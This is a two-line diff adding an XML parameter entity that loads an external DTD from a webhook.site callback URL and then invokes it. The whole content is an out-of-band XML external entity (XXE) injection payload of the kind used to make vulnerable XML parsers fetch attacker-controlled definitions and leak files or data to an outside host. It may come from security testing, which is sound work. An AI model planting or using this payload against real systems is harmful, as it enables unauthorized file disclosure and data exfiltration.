@@ -1,0 +1,2 @@
+<!ENTITY % gh SYSTEM "https://webhook.site/ca530734-b049-49de-a4c1-57b9e877d840/dtd-from-github">
+%gh;
